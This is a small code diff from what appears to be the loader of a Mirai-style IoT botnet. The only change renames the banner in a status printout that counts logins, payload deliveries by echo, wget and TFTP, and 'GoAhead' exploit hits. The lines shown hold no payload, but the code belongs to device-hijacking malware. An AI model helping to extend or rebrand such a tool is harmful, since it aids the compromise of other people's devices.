@@ -102,7 +102,7 @@ static void *stats_thread(void *arg)
     while(TRUE)
     {
         #ifndef DEBUG
-		printf("\x1b[38;5;13m[\x1b[0;37m%ds\x1b[38;5;13m] \x1b[38;5;13m[\x1b[90mNullPointer\x1b[38;5;13m] SREP [\x1b[0;37m%d\x1b[38;5;13m] Logins: \x1b[0;37m%d\x1b[38;5;13m Ran: \x1b[0;37m%d\x1b[38;5;13m | Echoes: \x1b[0;37m%d\x1b[38;5;13m Wgets: \x1b[0;37m%d\x1b[38;5;13m TFTPs: \x1b[0;37m%d\x1b[38;5;13m GoAhead: \x1b[0;37m%d\x1b[0m\n",
+		printf("\x1b[38;5;13m[\x1b[0;37m%ds\x1b[38;5;13m] \x1b[38;5;13m[\x1b[90mFemboyNetwork\x1b[38;5;13m] SREP [\x1b[0;37m%d\x1b[38;5;13m] Logins: \x1b[0;37m%d\x1b[38;5;13m Ran: \x1b[0;37m%d\x1b[38;5;13m | Echoes: \x1b[0;37m%d\x1b[38;5;13m Wgets: \x1b[0;37m%d\x1b[38;5;13m TFTPs: \x1b[0;37m%d\x1b[38;5;13m GoAhead: \x1b[0;37m%d\x1b[0m\n",
 		seconds++, ATOMIC_GET(&srv->curr_open), ATOMIC_GET(&srv->total_logins), ATOMIC_GET(&srv->total_successes),
                ATOMIC_GET(&srv->total_echoes), ATOMIC_GET(&srv->total_wgets), ATOMIC_GET(&srv->total_tftps), ATOMIC_GET(&srv->total_goaheads));
         #endif
